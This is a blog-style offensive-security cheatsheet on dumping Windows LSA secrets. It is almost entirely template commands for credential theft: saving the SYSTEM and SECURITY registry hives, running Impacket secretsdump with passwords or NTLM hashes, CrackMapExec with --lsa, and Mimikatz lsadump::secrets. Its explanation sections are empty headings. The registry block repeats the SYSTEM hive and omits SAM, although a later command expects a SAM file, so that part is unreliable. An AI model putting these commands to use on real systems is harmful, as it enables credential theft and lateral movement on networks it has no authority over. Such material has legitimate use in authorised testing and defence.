---
layout: single
title:  "OS Credential Dumping: LSA Secrets"
date:   2021-11-29
categories: CredentialAccess CredentialDumping
sidebar:
    nav: "credaccess"
toc: true
toc_label: Table of Contents
toc_sticky: true

---

# Introduction
LSA secrets is part of the data that is stored within the Local Security Authority (LSA) in Windows. LSA itself is utilized to store private data all things revolving around passwords hence why we might care about it. They live within the registry and can be found at `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets`. Naturally since its in the registry, in order to do anything with it, we'll need to have administrative access to the system in question. So in for a penny, in for a pound...

# Cheatsheet
Most of these methods will work without any extra work, but for reference I'll add alternatives to each incase you dont have cleartext password of the user involved, in which case the NTLM hash of the user will be sufficient. If all else fails you can manually save the registry files and export them to your attacking machine and manipulate them as needed. Also, this list will not be exhaustive, as during my research a lot of these tools just piggy back off of each other so I'll list the most common/popular ones that I've seen and used myself.

## Save Registry Files
{% highlight powershell %}
    reg.exe save HKLM\SYSTEM <NAME>
    reg.exe save HKLM\SECURITY <NAME>
    reg.exe save HKLM\SYSTEM <NAME>
{% endhighlight %}

## Impacket SecretsDump
{% highlight shell %}
    python3 secretsdump.py <AD FQDN>/<USERNAME>:<PASSWORD>@<IP ADDRESS>
    python3 secretsdump.py -hashes <NTLM FULL HASH> <AD FQDN>/<USERNAME>@<IP ADDRESS>
    python3 secretsdump.py -sam <SAMNAME> -security <SECURITYNAME> -system <SYSTEMNAME> LOCAL
{% endhighlight %}

## CrackMapExec
{% highlight shell %}
    crackmapexec smb <IP ADDRESS OR RANGE> -u <USERNAME> -p '<PASSWORD>' --lsa
{% endhighlight %}

## Mimikatz (Windows)
{% highlight powershell %}
    lsadump::secrets /system:<LOCATION OF SYSTEM REG FILE> /security:<LOCATION OF SECURITY FILE>
{% endhighlight %}

<br>
# Down The Rabbit Hole
## Attack Demonstration
## What's Really Happening



# Tool References
1. [Impacket SecretsDump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)
2. [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
3. [Mimikatz](https://github.com/gentilkiwi/mimikatz)

# References
1. [https://attack.mitre.org/techniques/T1003/004/](https://attack.mitre.org/techniques/T1003/004/)
2. [https://www.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration/](https://www.sentinelone.com/blog/windows-security-essentials-preventing-4-common-methods-of-credentials-exfiltration/)
3. [https://www.passcape.com/index.php?section=docsys&cmd=details&id=23](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23)
4. [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)